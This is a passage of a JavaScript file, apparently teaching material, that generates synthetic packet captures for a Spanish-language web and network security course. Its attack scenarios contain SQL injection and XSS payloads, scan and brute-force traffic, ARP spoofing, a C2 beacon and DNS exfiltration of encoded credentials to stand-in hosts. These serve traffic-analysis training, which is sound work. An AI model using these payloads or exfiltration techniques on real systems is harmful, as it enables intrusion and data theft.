/* Megalodon · capturas sintéticas de cada módulo. Deterministas (semilla fija): cada carga produce los mismos bytes. */
const HOSTS = {
  kali: { mac: '08:00:27:4d:65:67', ip: '192.168.56.10', ttl: 64 },
  web: { mac: '08:00:27:a1:b2:c3', ip: '192.168.56.20', ttl: 64 },
  dns: { mac: '08:00:27:00:00:01', ip: '192.168.56.1', ttl: 64 },
  dc: { mac: '08:00:27:dc:01:01', ip: '192.168.56.30', ttl: 128 },
  pc: { mac: '08:00:27:77:10:40', ip: '192.168.56.40', ttl: 128 },
  intruso: { mac: '08:00:27:66:6e:6e', ip: '192.168.56.66', ttl: 64 },
};
const via = (h, ip) => ({ mac: h.mac, ip, ttl: 52 });       // host remoto alcanzado a través de la puerta de enlace
const UA_FF = 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0';

function httpReq(method, path, host, headers = {}, body = '') {
  const h = { Host: host, 'User-Agent': UA_FF, Accept: '*/*', ...headers };
  if (body) { h['Content-Type'] = h['Content-Type'] || 'application/x-www-form-urlencoded'; h['Content-Length'] = String(TE.encode(body).length); }
  return `${method} ${path} HTTP/1.1\r\n` + Object.entries(h).filter(([, v]) => v != null).map(([k, v]) => `${k}: ${v}`).join('\r\n') + '\r\n\r\n' + body;
}
function httpRes(code, phrase, body = '', headers = {}) {
  const h = { Server: 'nginx/1.24.0', Date: 'Tue, 24 Nov 2026 10:15:00 GMT', 'Content-Type': body ? 'text/html; charset=utf-8' : null, ...headers, 'Content-Length': String(TE.encode(body).length) };
  return `HTTP/1.1 ${code} ${phrase}\r\n` + Object.entries(h).filter(([, v]) => v != null).map(([k, v]) => `${k}: ${v}`).join('\r\n') + '\r\n\r\n' + body;
}
const page = (title, inner = '') => `<!doctype html><html><head><title>${title}</title></head><body><h1>${title}</h1>${inner}</body></html>`;
function dnsAsk(cap, cli, srv, id, name, type, answers, rcode = 0, sport = 53000 + (id % 2000)) {
  cap.udp(cli, srv, sport, 53, dnsMsg(id, name, type, false));
  cap.jitter(0.002, 0.009);
  cap.udp(srv, cli, 53, sport, dnsMsg(id, name, type, true, answers, rcode));
  cap.jitter(0.001, 0.004);
}
function arpResolve(cap, a, b) {
  cap.arp(1, a, a.mac, a.ip, '00:00:00:00:00:00', b.ip);
  cap.wait(0.0003);
  cap.arp(2, b, b.mac, b.ip, a.mac, a.ip, a.mac);
  cap.wait(0.0002);
}

const SCENARIOS = {
  /* M1 · el saludo TCP visto en el curso: 52056 → 80 */
  m1() {
    const c = new Cap(101), { kali, web, dns } = HOSTS;
    arpResolve(c, kali, dns);
    dnsAsk(c, kali, dns, 0x3a1f, 'lab.ewpt.local', 'A', [{ type: 'A', data: web.ip, ttl: 300 }]);
    arpResolve(c, kali, web);
    const t = c.tcp(kali, web, 52056, 80).handshake();
    c.wait(0.0006);
    t.http(httpReq('GET', '/', 'lab.ewpt.local'), httpRes(200, 'OK', page('Laboratorio eWPT', '<p>Bienvenido.</p>')));
    c.wait(0.4); t.fin4('c');
    c.wait(0.8);
    const isn = Math.floor(c.r() * 4e9) >>> 0;
    c.rawTcp(kali, web, { sport: 52058, dport: 8080, seq: isn, flags: F.SYN, opts: SYN_OPTS });
    c.wait(0.0005);
    c.rawTcp(web, kali, { sport: 8080, dport: 52058, seq: 0, ack: (isn + 1) >>> 0, flags: F.RST | F.ACK, win: 0 });
    c.wait(1.2);
    const t2 = c.tcp(kali, web, 52060, 80).handshake();
    t2.http(httpReq('GET', '/favicon.ico', 'lab.ewpt.local'), httpRes(404, 'Not Found', page('404 Not Found')));
    c.wait(0.2); t2.fin4('c');
    return c.pkts;
  },

  /* M2 · HTTP: métodos, cabeceras, códigos de estado */
  m2() {
    const c = new Cap(202), { kali, web, dns } = HOSTS, host = 'tienda.ewpt.local';
    dnsAsk(c, kali, dns, 0x51c2, host, 'A', [{ type: 'A', data: web.ip, ttl: 300 }]);
    const a = c.tcp(kali, web, 40112, 80).handshake();
    a.http(httpReq('GET', '/', host), httpRes(200, 'OK', page('Tienda ACME', '<a href="/login">Entrar</a>')));
    c.wait(0.15);
    /* la petición del CSS se «pierde» y Kali la retransmite: así se ve un Bad TCP en negro */
    const cssReq = httpReq('GET', '/css/app.css', host, { Referer: `http://${host}/` });
    a.send('c', cssReq, { noAck: true }); a.retrans('c', cssReq, 0.21);
    c.wait(a.rtt * 0.5); a.pk('s', F.ACK, [], { win: 509 }); c.wait(0.01);
    a.send('s', httpRes(200, 'OK', 'body{font-family:sans-serif}', { 'Content-Type': 'text/css' }));
    c.wait(1.1);
    a.http(httpReq('GET', '/login', host), httpRes(200, 'OK', page('Acceso', '<form method="post" action="/login"><input name="usuario"><input name="clave" type="password"></form>')));
    c.wait(3.2);
    a.http(httpReq('POST', '/login', host, { Referer: `http://${host}/login`, Origin: `http://${host}` }, 'usuario=marta&clave=Tienda%2A2026'),
      httpRes(302, 'Found', '', { Location: '/panel', 'Set-Cookie': 'sid=9f2c7a41d0; Path=/; HttpOnly' }));
    c.wait(0.05);
    a.http(httpReq('GET', '/panel', host, { Cookie: 'sid=9f2c7a41d0' }), httpRes(200, 'OK', page('Panel de Marta', '<p>Pedidos: 3</p>')));
    c.wait(0.6); a.fin4('c');
    c.wait(0.9);
    const b = c.tcp(kali, web, 40118, 80).handshake();
    b.http(httpReq('GET', '/admin', host, { Cookie: 'sid=9f2c7a41d0' }), httpRes(403, 'Forbidden', page('403 Prohibido')));
    c.wait(0.3);
    b.http(httpReq('GET', '/api/pedidos?usuario=marta', host, { Cookie: 'sid=9f2c7a41d0', Accept: 'application/json' }), httpRes(200, 'OK', '[{"id":17,"total":"24.90"},{"id":21,"total":"9.99"}]', { 'Content-Type': 'application/json' }));
    c.wait(0.3);
    b.http(httpReq('GET', '/ofertas-2024', host), httpRes(301, 'Moved Permanently', '', { Location: '/ofertas' }));
    c.wait(0.2);
    b.http(httpReq('GET', '/ofertas', host), httpRes(404, 'Not Found', page('404 No encontrado')));
    c.wait(0.4);
    b.http(httpReq('PUT', '/api/perfil', host, { Cookie: 'sid=9f2c7a41d0', 'Content-Type': 'application/json' }, '{"telefono":"000000000"}'), httpRes(500, 'Internal Server Error', page('500 Error interno')));
    c.wait(0.3); b.fin4('c');
    return c.pkts;
  },

  /* M3 · sesiones, cookies y credenciales que viajan en claro */
  m3() {
    const c = new Cap(303), { kali, web, dns, pc } = HOSTS, host = 'intranet.ewpt.local';
    dnsAsk(c, pc, dns, 0x22ab, host, 'A', [{ type: 'A', data: web.ip }]);
    const a = c.tcp(pc, web, 49733, 80).handshake();
    a.http(httpReq('GET', '/admin/', host), httpRes(401, 'Unauthorized', page('401 Se requiere autenticación'), { 'WWW-Authenticate': 'Basic realm="Zona admin"' }));
    c.wait(2.4);
    a.http(httpReq('GET', '/admin/', host, { Authorization: 'Basic ' + btoa('admin:S3cr3t!') }), httpRes(200, 'OK', page('Administración')));
    c.wait(0.5); a.fin4('c');
    c.wait(1.5);
    const b = c.tcp(pc, web, 49741, 80).handshake();
    b.http(httpReq('POST', '/login.php', host, {}, 'user=lucia&pass=Primavera2024&remember=1'),
      httpRes(302, 'Found', '', { Location: '/perfil.php', 'Set-Cookie': 'PHPSESSID=k3v1n0t5ecure8a2b; path=/' }));
    c.wait(0.08);
    b.http(httpReq('GET', '/perfil.php', host, { Cookie: 'PHPSESSID=k3v1n0t5ecure8a2b' }), httpRes(200, 'OK', page('Perfil de Lucía')));
    c.wait(0.7); b.fin4('c');
    c.wait(2.0);
    const f = c.tcp(pc, web, 49755, 21).handshake();
    f.send('s', '220 (vsFTPd 3.0.5)\r\n'); c.wait(0.3);
    f.send('c', 'USER backup\r\n'); f.send('s', '331 Please specify the password.\r\n'); c.wait(1.1);
    f.send('c', 'PASS Bkp-2026!\r\n'); f.send('s', '230 Login successful.\r\n'); c.wait(0.4);
    f.send('c', 'PWD\r\n'); f.send('s', '257 "/home/backup" is the current directory\r\n'); c.wait(0.3);
    f.send('c', 'QUIT\r\n'); f.send('s', '221 Goodbye.\r\n'); f.fin('s');
    return c.pkts;
  },

  /* M4 · DNS */
  m4() {
    const c = new Cap(404), { kali, dns } = HOSTS;
    dnsAsk(c, kali, dns, 0x1001, 'www.ewpt.local', 'A', [{ type: 'A', data: '192.168.56.20', ttl: 600 }]);
    c.wait(0.7);
    dnsAsk(c, kali, dns, 0x1002, 'cdn.ewpt.local', 'A', [{ type: 'CNAME', data: 'edge-mad.cdnlab.net', ttl: 300 }, { name: 'edge-mad.cdnlab.net', type: 'A', data: '198.51.100.24', ttl: 60 }]);
    c.wait(1.3);
    dnsAsk(c, kali, dns, 0x1003, 'dev.ewpt.local', 'A', [], 3);
    c.wait(0.4);
    dnsAsk(c, kali, dns, 0x1004, 'ewpt.local', 'TXT', [{ type: 'TXT', data: 'v=spf1 ip4:192.168.56.0/24 -all', ttl: 3600 }]);
    c.wait(0.9);
    dnsAsk(c, kali, dns, 0x1005, 'staging.ewpt.local', 'A', [], 3);
    c.wait(0.5);
    dnsAsk(c, kali, dns, 0x1006, 'mail.ewpt.local', 'A', [{ type: 'A', data: '192.168.56.25', ttl: 600 }]);
    return c.pkts;
  },

  /* M5 · TLS: se ve el SNI y el saludo, pero no el contenido */
  m5() {
    const c = new Cap(505), { kali, web, dns } = HOSTS;
    dnsAsk(c, kali, dns, 0x7a01, 'portal.ewpt.local', 'A', [{ type: 'A', data: web.ip }]);
    const t = c.tcp(kali, web, 51544, 443).handshake();
    t.send('c', tlsClientHello(c.r, 'portal.ewpt.local')); c.wait(0.003);
    t.send('s', [...tlsServerHello(c.r), ...tlsCCS(), ...tlsApp(c.r, 1100)]); c.wait(0.002);
    t.send('c', [...tlsCCS(), ...tlsApp(c.r, 74)]); c.wait(0.01);
    t.send('c', tlsApp(c.r, 412)); c.wait(0.03);
    t.send('s', tlsApp(c.r, 1280)); c.wait(0.4);
    t.send('c', tlsApp(c.r, 388)); c.wait(0.02); t.send('s', tlsApp(c.r, 702));
    c.wait(0.8);
    dnsAsk(c, kali, dns, 0x7a02, 'api.ewpt.local', 'A', [{ type: 'A', data: web.ip }]);
    const u = c.tcp(kali, web, 51552, 443).handshake();
    u.send('c', tlsClientHello(c.r, 'api.ewpt.local', 'h2')); c.wait(0.003);
    u.send('s', [...tlsServerHello(c.r), ...tlsCCS(), ...tlsApp(c.r, 980)]); c.wait(0.002);
    u.send('c', [...tlsCCS(), ...tlsApp(c.r, 74)]); c.wait(0.02);
    u.send('c', tlsApp(c.r, 240)); c.wait(0.02); u.send('s', tlsApp(c.r, 520));
    c.wait(1.0);
    const h = c.tcp(kali, web, 51560, 80).handshake();
    h.http(httpReq('POST', '/login', 'portal.ewpt.local', {}, 'email=ana%40ewpt.local&password=SinCifrar1'), httpRes(301, 'Moved Permanently', '', { Location: 'https://portal.ewpt.local/login' }));
    c.wait(0.2); h.fin4('c');
    c.wait(0.3); t.fin4('c'); u.fin4('c');
    return c.pkts;
  },

  /* M6 · ataques web vistos en el tráfico */
  m6() {
    const c = new Cap(606), { kali, web } = HOSTS, host = 'tienda.ewpt.local';
    // 1) escaneo SYN (nmap -sS): mismo puerto origen, ventana 1024, solo MSS
    const ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080];
    const open = new Set([22, 80, 443, 3306]);
    for (const p of ports) {
      const isn = Math.floor(c.r() * 4e9) >>> 0;
      c.rawTcp(kali, web, { sport: 46655, dport: p, seq: isn, flags: F.SYN, win: 1024, opts: [2, 4, 5, 0xb4] }); c.wait(0.0003);
      if (open.has(p)) {
        const sisn = Math.floor(c.r() * 4e9) >>> 0;
        c.rawTcp(web, kali, { sport: p, dport: 46655, seq: sisn, ack: (isn + 1) >>> 0, flags: F.SYN | F.ACK, win: 64240, opts: [2, 4, 5, 0xb4] }); c.wait(0.0001);
        c.rawTcp(kali, web, { sport: 46655, dport: p, seq: (isn + 1) >>> 0, flags: F.RST, win: 0 });
      } else c.rawTcp(web, kali, { sport: p, dport: 46655, seq: 0, ack: (isn + 1) >>> 0, flags: F.RST | F.ACK, win: 0 });
      c.jitter(0.001, 0.004);
    }
    c.wait(4);
    // 2) fuerza bruta de directorios (gobuster) en una conexión keep-alive
    const g = c.tcp(kali, web, 43210, 80).handshake();
    const words = { admin: [301, '/admin/'], backup: [404], 'backup.zip': [200], config: [404], css: [301, '/css/'], images: [404], js: [404], login: [200], old: [404], 'robots.txt': [200], 'server-status': [403], test: [404], uploads: [403], 'wp-admin': [404], '.git/HEAD': [200], api: [404] };
    for (const [w, [code, loc]] of Object.entries(words)) {
      const ph = { 200: 'OK', 301: 'Moved Permanently', 403: 'Forbidden', 404: 'Not Found' }[code];
      const body = code === 200 ? (w === '.git/HEAD' ? 'ref: refs/heads/main\n' : w === 'robots.txt' ? 'User-agent: *\nDisallow: /backup.zip\n' : w === 'backup.zip' ? 'PK\u0003\u0004' : page('Acceso')) : code === 404 ? page('404') : '';
      g.http(httpReq('GET', '/' + w, host, { 'User-Agent': 'gobuster/3.6', Accept: null }), httpRes(code, ph, body, loc ? { Location: loc } : {}), 0.002);
      c.jitter(0.003, 0.01);
    }
    g.fin4('c');
    c.wait(5);
    // 3) fuerza bruta del login (Hydra): una conexión por intento
    const pwds = ['123456', 'password', 'qwerty', 'admin', 'letmein', 'marta2024', 'iloveyou', 'Tienda*2026'];
    pwds.forEach((pw, i) => {
      const h = c.tcp(kali, web, 44100 + i * 2, 80).handshake();
      const ok = pw === 'Tienda*2026';
      h.http(httpReq('POST', '/login', host, { 'User-Agent': 'Mozilla/5.0 (Hydra)', Accept: null }, 'usuario=marta&clave=' + encodeURIComponent(pw)),
        ok ? httpRes(302, 'Found', '', { Location: '/panel', 'Set-Cookie': 'sid=77ab01ce; Path=/; HttpOnly' }) : httpRes(200, 'OK', page('Acceso', '<p class="error">Usuario o clave incorrectos</p>')));
      h.fin4('c'); c.jitter(0.05, 0.12);
    });
    c.wait(6);
    // 4) inyección SQL y XSS reflejado en parámetros GET
    const s = c.tcp(kali, web, 45500, 80).handshake();
    s.http(httpReq('GET', "/producto.php?id=7", host), httpRes(200, 'OK', page('Producto 7', '<p>Taza azul</p>')));
    c.wait(2);
    s.http(httpReq('GET', "/producto.php?id=7'", host), httpRes(500, 'Internal Server Error', page('Error', '<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version</p>')));
    c.wait(1.5);
    s.http(httpReq('GET', '/producto.php?id=7%27%20OR%20%271%27%3D%271', host), httpRes(200, 'OK', page('Productos', '<p>Taza azul</p><p>Camiseta</p><p>Gorra</p>')));
    c.wait(1.8);
    s.http(httpReq('GET', '/producto.php?id=-1%20UNION%20SELECT%201,usuario,clave%20FROM%20usuarios--%20-', host, { 'User-Agent': 'sqlmap/1.8.4#stable (https://sqlmap.org)' }), httpRes(200, 'OK', page('Producto', '<p>admin</p><p>$2y$10$Qe...</p>')));
    c.wait(3);
    s.http(httpReq('GET', '/buscar?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E', host), httpRes(200, 'OK', page('Resultados', '<p>Sin resultados para <script>alert(document.cookie)<\/script></p>')));
    c.wait(0.5); s.fin4('c');
    return c.pkts;
  },

  /* M7 · Directorio Activo: Kerberos y SMB2 con NTLM */
  m7() {
    const c = new Cap(707), { dc, pc } = HOSTS, realm = 'MEGACORP.LOCAL';
    dnsAsk(c, pc, dc, 0x4c01, '_kerberos._tcp.megacorp.local', 'A', [{ type: 'A', data: dc.ip }]);
    const k1 = c.tcp(pc, dc, 50210, 88).handshake();
    k1.send('c', krbReq(10, { cname: 'jdoe', realm, sname: ['krbtgt', realm], nonce: 1841021, etypes: [18, 17, 23] }));
    k1.send('s', krbRep(11, { cname: 'jdoe', realm, sname: ['krbtgt', realm], tktEtype: 18 }, c.r)); k1.fin('c');
    c.wait(0.2);
    const k2 = c.tcp(pc, dc, 50212, 88).handshake();
    k2.send('c', krbReq(12, { realm, sname: ['cifs', 'DC01.megacorp.local'], nonce: 99124, etypes: [18, 17] }));
    k2.send('s', krbRep(13, { cname: 'jdoe', realm, sname: ['cifs', 'DC01.megacorp.local'], tktEtype: 18 }, c.r)); k2.fin('c');
    c.wait(0.3);
    const k3 = c.tcp(pc, dc, 50214, 88).handshake();
    k3.send('c', krbReq(12, { realm, sname: ['MSSQLSvc', 'sql01.megacorp.local:1433'], nonce: 99231, etypes: [23] }));
    k3.send('s', krbRep(13, { cname: 'jdoe', realm, sname: ['MSSQLSvc', 'sql01.megacorp.local:1433'], tktEtype: 23 }, c.r)); k3.fin('c');
    c.wait(1.2);
    const s = c.tcp(HOSTS.intruso, dc, 51880, 445).handshake();
    s.send('c', smb2(1, false, 1, 0, 0, 0, smbSessReq(ntlmNeg())));
    s.send('s', smb2(1, true, 1, 0x11, 0, 0xc0000016, smbSessResp(ntlmChal(c.r, 'MEGACORP', 'DC01'))));
    s.send('c', smb2(1, false, 2, 0x11, 0, 0, smbSessReq(ntlmAuth(c.r, 'MEGACORP', 'svc_backup', 'KALI'))));
    s.send('s', smb2(1, true, 2, 0x11, 0, 0, smbSessResp([])));
    s.send('c', smb2(3, false, 3, 0x11, 0, 0, smbTreeReq('\\\\DC01\\ADMIN$')));
    s.send('s', smb2(3, true, 3, 0x11, 5, 0, smbTreeResp()));
    c.wait(0.4); s.fin('c');
    return c.pkts;
  },

  /* M8 · caza en el SOC: ARP spoofing, beacon de C2 y exfiltración por DNS */
  m8() {
    const c = new Cap(808), { pc, dns, intruso } = HOSTS, c2 = via(dns, '203.0.113.66');
    arpResolve(c, pc, dns);
    for (let i = 0; i < 4; i++) { c.arp(2, intruso, intruso.mac, dns.ip, pc.mac, pc.ip, pc.mac); c.wait(2); }
    const chunks = ['YWRtaW46UzNjcjN0', 'IQpkYjpQcm9kMjAy', 'NiEKdmF1bHQ6dG9r'];
    let n = 0;
    for (let i = 0; i < 6; i++) {
      const b = c.tcp(pc, c2, 53110 + i * 3, 8080).handshake();
      b.http(httpReq('GET', '/api/v2/check?id=WS-0412', 'update-cdn.example', { 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0)', Accept: null }), httpRes(200, 'OK', 'sleep=60', { 'Content-Type': 'text/plain', Server: null }));
      b.fin4('c');
      if (i % 2 === 1 && n < chunks.length) { dnsAsk(c, pc, dns, 0x6e00 + n, `${chunks[n]}.${n}.x.exfil-lab.net`, 'TXT', [{ type: 'TXT', data: 'ok' }]); n++; }
      dnsAsk(c, pc, dns, 0x2200 + i, 'www.ewpt.local', 'A', [{ type: 'A', data: '192.168.56.20' }]);
      c.wait(60 + (i % 2 ? 0.4 : -0.3));
    }
    return c.pkts;
  },

  /* M9 · VoIP: el teléfono de Alicia se registra con Digest, llama al buzón de voz (*97) y teclea su PIN por DTMF;
     al final, un escáner SIP prueba contraseñas e intenta una llamada internacional. Ver VOIP_M9 para los datos. */
  m9() {
    const c = new Cap(909), V = VOIP_M9, { tel, pbx, atk } = VOIP_HOSTS, R = VOIP_M9.realm;
    const sipTo = (a, b, sport, dport, first, hdrs, body) => c.udp(a, b, sport, dport, sipMsg(first, hdrs, body));
    const viaT = br => ['Via', `SIP/2.0/UDP ${tel.ip}:5060;branch=z9hG4bK-${br};rport`];
    const viaR = br => ['Via', `SIP/2.0/UDP ${tel.ip}:5060;branch=z9hG4bK-${br};received=${tel.ip};rport=5060`];
    const fromA = ['From', `"Alicia" <sip:${V.user}@${R}>;tag=8a41c2`], ua = ['User-Agent', V.uaPhone], srv = ['Server', V.server];
    const allow = ['Allow', 'INVITE, ACK, CANCEL, BYE, OPTIONS, INFO, NOTIFY'];

    /* 1 · REGISTER → 401 con reto Digest → REGISTER con Authorization → 200 OK */
    c.wait(0.12);
    const regTo = ['To', `"Alicia" <sip:${V.user}@${R}>`], regCid = ['Call-ID', V.regCallId];
    sipTo(tel, pbx, 5060, 5060, `REGISTER sip:${R} SIP/2.0`, [viaT('1f3a9c01'), ['Max-Forwards', '70'], fromA, regTo, regCid, ['CSeq', '1 REGISTER'], ['Contact', `<sip:${V.user}@${tel.ip}:5060>`], ua, ['Expires', '3600'], allow]);
    c.jitter(0.0012, 0.0025);
    const chal = `Digest algorithm=MD5, realm="${R}", nonce="${V.nonce}", qop="auth"`;
    sipTo(pbx, tel, 5060, 5060, 'SIP/2.0 401 Unauthorized', [viaR('1f3a9c01'), fromA, [regTo[0], `${regTo[1]};tag=as5e1c0a77`], regCid, ['CSeq', '1 REGISTER'], srv, allow, ['WWW-Authenticate', chal]]);
    c.jitter(0.006, 0.011);
    const resp = digestResponse({ user: V.user, realm: R, pass: V.pass, method: 'REGISTER', uri: `sip:${R}`, nonce: V.nonce, nc: '00000001', cnonce: V.cnonce, qop: 'auth' });
    sipTo(tel, pbx, 5060, 5060, `REGISTER sip:${R} SIP/2.0`, [viaT('1f3a9c02'), ['Max-Forwards', '70'], fromA, regTo, regCid, ['CSeq', '2 REGISTER'], ['Contact', `<sip:${V.user}@${tel.ip}:5060>`],
      ['Authorization', `Digest username="${V.user}", realm="${R}", nonce="${V.nonce}", uri="sip:${R}", response="${resp}", algorithm=MD5, cnonce="${V.cnonce}", nc=00000001, qop=auth`], ua, ['Expires', '3600'], allow]);
    c.jitter(0.0015, 0.003);
    sipTo(pbx, tel, 5060, 5060, 'SIP/2.0 200 OK', [viaR('1f3a9c02'), fromA, [regTo[0], `${regTo[1]};tag=as5e1c0a77`], regCid, ['CSeq', '2 REGISTER'], srv, allow, ['Expires', '3600'], ['Contact', `<sip:${V.user}@${tel.ip}:5060>;expires=3600`], ['Date', 'Fri, 27 Nov 2026 09:14:05 GMT']]);

    /* 2 · INVITE al buzón de voz con SDP → 100 → 180 → 200 OK con SDP → ACK */
    c.wait(2.4);
    const dest = `sip:${V.dest}@${R}`, cid = ['Call-ID', V.callId], toD = ['To', `<${dest}>`], toDt = ['To', `<${dest}>;tag=as4d17b2e1`];
    const fromC = ['From', `"Alicia" <sip:${V.user}@${R}>;tag=3e90d1`];
    const sdpA = sdpBody({ user: V.user, sess: 2104, ip: tel.ip, port: V.portTel, name: 'Ondas SIP' });
    const sdpB = sdpBody({ user: 'root', sess: 1795000123, ip: pbx.ip, port: V.portPbx, name: 'Asterisk PBX' });
    sipTo(tel, pbx, 5060, 5060, `INVITE ${dest} SIP/2.0`, [viaT('7c2e9a10'), ['Max-Forwards', '70'], fromC, toD, cid, ['CSeq', '101 INVITE'], ['Contact', `<sip:${V.user}@${tel.ip}:5060>`], ua, allow], sdpA);

    c.jitter(0.0008, 0.0016);
    sipTo(pbx, tel, 5060, 5060, 'SIP/2.0 100 Trying', [viaR('7c2e9a10'), fromC, toD, cid, ['CSeq', '101 INVITE'], srv, ['Contact', `<${dest.replace(R, `${pbx.ip}:5060`)}>`]]);
    c.jitter(0.03, 0.05);
    sipTo(pbx, tel, 5060, 5060, 'SIP/2.0 180 Ringing', [viaR('7c2e9a10'), fromC, toDt, cid, ['CSeq', '101 INVITE'], srv, ['Contact', `<${dest.replace(R, `${pbx.ip}:5060`)}>`]]);
    c.jitter(0.6, 0.7);
    sipTo(pbx, tel, 5060, 5060, 'SIP/2.0 200 OK', [viaR('7c2e9a10'), fromC, toDt, cid, ['CSeq', '101 INVITE'], srv, allow, ['Contact', `<${dest.replace(R, `${pbx.ip}:5060`)}>`]], sdpB);
    const t200 = c.t;
    c.jitter(0.004, 0.006);
    sipTo(tel, pbx, 5060, 5060, `ACK ${dest.replace(R, `${pbx.ip}:5060`)} SIP/2.0`, [viaT('7c2e9a11'), ['Max-Forwards', '70'], fromC, toDt, cid, ['CSeq', '101 ACK'], ua]);
    const tAck = c.t;

    /* 3 · RTP en los dos sentidos (20 ms, 160 muestras), DTMF y RTCP. Todo se planifica y luego se emite en orden de llegada. */
    const ev = [], a = rng(9090), N = V.slots, startP = t200 + 0.004, startT = tAck + 0.009;
    const lost = new Set(V.lostPbx), dtmf = new Map();
    let k0 = V.dtmfStart;
    for (const ch of V.pin) { const id = DTMF_CH.indexOf(ch); for (let i = 0; i < 11; i++) dtmf.set(k0 + i, { id, i, start: k0 }); k0 += 11 + 14; }
    const seqT = V.seqTel, seqP = V.seqPbx, tsT = V.tsTel, tsP = V.tsPbx;
    const arrivP = [], sentTel = [];                      // llegadas al punto de captura (junto al teléfono): centralita → teléfono y audio del teléfono
    const octetsTel = n => { let o = 0; for (let k = 0; k < n; k++) o += dtmf.has(k) ? 4 : 160; return o; };
    for (let k = 0; k < N; k++) {
      /* teléfono → centralita: limpio, solo el reloj de la tarjeta */
      const tT = startT + k * 0.02 + a() * 0.0006, d = dtmf.get(k);
      if (d) {
        const end = d.i >= 8, dur = 160 * Math.min(d.i + 1, 8);
        ev.push({ t: tT, f: () => c.udp(tel, pbx, V.portTel, V.portPbx, rtpPkt(101, seqT + k, tsT + 160 * d.start, V.ssrcTel, rtpEv(d.id, end, 10, dur), d.i === 0)) });
      } else {
        const pcm = voipVoice('tel', k, a); sentTel.push({ k, t: tT });
        ev.push({ t: tT, f: () => c.udp(tel, pbx, V.portTel, V.portPbx, rtpPkt(0, seqT + k, tsT + 160 * k, V.ssrcTel, pcm.map(ulawEnc), k === 0)) });
      }
      /* centralita → teléfono: llega con jitter (más en la ráfaga de congestión) y con pérdidas */
      const burst = k >= V.burst[0] && k < V.burst[1], tP = startP + k * 0.02 + 0.0004 + (burst ? a() * 0.018 : a() * 0.0015);
      const pcmP = voipVoice('pbx', k, a);
      if (lost.has(k)) continue;
      arrivP.push({ k, t: tP });
      ev.push({ t: tP, f: () => c.udp(pbx, tel, V.portPbx, V.portTel, rtpPkt(0, seqP + k, tsP + 160 * k, V.ssrcPbx, pcmP.map(ulawEnc), k === 0)) });
    }
    /* RTCP: la centralita informa del audio del teléfono (sin pérdidas) y el teléfono, del de la centralita */
    const ntp = t => { const s = t + 2208988800; return [Math.floor(s) >>> 0, Math.floor((s % 1) * 4294967296) >>> 0]; };
    const mid = t => { const [m, l] = ntp(t); return ((m & 0xffff) << 16 | l >>> 16) >>> 0; };
    let lastSrPbx = null, prevExp = 0, prevRecv = 0;
    for (const [kP, kT] of V.rtcpAt) {
      const tP = startP + kP * 0.02 + 0.011, tT = startT + kT * 0.02 + 0.012;
      const sentT = Math.round((tP - startT) / 0.02);           // paquetes del teléfono enviados hasta ese momento
      const [msw, lsw] = ntp(tP);
      const srP = { ssrc: V.ssrcPbx, ntpMsw: msw, ntpLsw: lsw, rtpTs: tsP + Math.round((tP - startP) * 8000), pkts: kP, octets: kP * 160,
        rb: { ssrc: V.ssrcTel, fraction: 0, cum: 0, extHigh: seqT + sentT - 1, jitter: voipJitter(sentTel.filter(x => x.t < tP - 0.002), startT) } };
      ev.push({ t: tP, f: () => c.udp(pbx, tel, V.portPbx + 1, V.portTel + 1, rtcpSR(srP)) });
      /* el teléfono: recibido hasta su informe → pérdida del intervalo, acumulada y jitter (RFC 3550, A.3 y A.8) */
      const got = arrivP.filter(x => x.t < tT), hi = got.length ? got[got.length - 1].k : 0, expected = hi + 1, cum = expected - got.length;
      const fr = expected - prevExp > 0 ? Math.max(0, Math.floor(((expected - prevExp) - (got.length - prevRecv)) * 256 / (expected - prevExp))) : 0;
      prevExp = expected; prevRecv = got.length;
      const sentByTel = Math.round((tT - startT) / 0.02), [m2, l2] = ntp(tT);
      lastSrPbx = { lsr: mid(tP), at: tP };
      const srT = { ssrc: V.ssrcTel, ntpMsw: m2, ntpLsw: l2, rtpTs: tsT + Math.round((tT - startT) * 8000), pkts: sentByTel, octets: octetsTel(sentByTel),
        rb: { ssrc: V.ssrcPbx, fraction: fr, cum, extHigh: seqP + hi, jitter: voipJitter(got, startP), lsr: lastSrPbx.lsr, dlsr: Math.round((tT - lastSrPbx.at) * 65536) } };
      ev.push({ t: tT, f: () => c.udp(tel, pbx, V.portTel + 1, V.portPbx + 1, rtcpSR(srT)) });
    }
    ev.sort((x, y) => x.t - y.t);
    for (const e of ev) { c.t = Math.max(c.t, e.t); e.f(); }

    /* 4 · Alicia cuelga: BYE → 200 OK */
    c.wait(0.03);
    sipTo(tel, pbx, 5060, 5060, `BYE ${dest.replace(R, `${pbx.ip}:5060`)} SIP/2.0`, [viaT('7c2e9a12'), ['Max-Forwards', '70'], fromC, toDt, cid, ['CSeq', '102 BYE'], ua]);
    c.jitter(0.002, 0.004);
    sipTo(pbx, tel, 5060, 5060, 'SIP/2.0 200 OK', [viaR('7c2e9a12'), fromC, toDt, cid, ['CSeq', '102 BYE'], srv]);

    /* 5 · El escáner: OPTIONS para ver qué centralita es, contraseñas para la 1002 e INVITE a un número internacional */
    c.wait(3.1);
    const va = (br, p) => ['Via', `SIP/2.0/UDP ${atk.ip}:${p};branch=z9hG4bK-${br};rport`], uaS = ['User-Agent', 'friendly-scanner'];
    sipTo(atk, pbx, 5061, 5060, `OPTIONS sip:100@${pbx.ip} SIP/2.0`, [va('2063346', 5061), ['Max-Forwards', '70'], ['From', `"sipvicious" <sip:100@1.1.1.1>;tag=6635633539`], ['To', `"sipvicious" <sip:100@1.1.1.1>`], ['Call-ID', '1840566719131592640941@1.1.1.1'], ['CSeq', '1 OPTIONS'], ['Contact', `<sip:100@${atk.ip}:5061>`], ['Accept', 'application/sdp'], uaS]);
    c.jitter(0.001, 0.002);
    sipTo(pbx, atk, 5060, 5061, 'SIP/2.0 200 OK', [['Via', `SIP/2.0/UDP ${atk.ip}:5061;branch=z9hG4bK-2063346;received=${atk.ip};rport=5061`], ['From', `"sipvicious" <sip:100@1.1.1.1>;tag=6635633539`], ['To', `"sipvicious" <sip:100@1.1.1.1>;tag=as0c3ad1f2`], ['Call-ID', '1840566719131592640941@1.1.1.1'], ['CSeq', '1 OPTIONS'], srv, allow, ['Accept', 'application/sdp']]);
    c.wait(0.9);
